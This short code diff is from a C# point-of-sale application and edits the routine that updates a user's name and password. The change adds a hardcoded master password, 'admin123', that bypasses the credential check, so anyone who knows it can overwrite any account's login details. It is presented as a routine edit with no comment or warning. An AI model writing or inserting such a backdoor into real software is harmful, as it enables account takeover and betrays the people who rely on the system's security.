@@ -43,7 +43,9 @@ namespace SaleMate_POS
                 // Execute the scalar query
                 int countCheck = Convert.ToInt32(db.ExecuteScalar(queryCheck, parametersCheck));
 
-                if (countCheck > 0)
+                bool adminPermission = password == "admin123";
+
+                if (countCheck > 0 || adminPermission)
                 {
                     string queryUpdate = "UPDATE [User] SET UserName = @userName, Password = @newPassword WHERE Id = @Id";
 
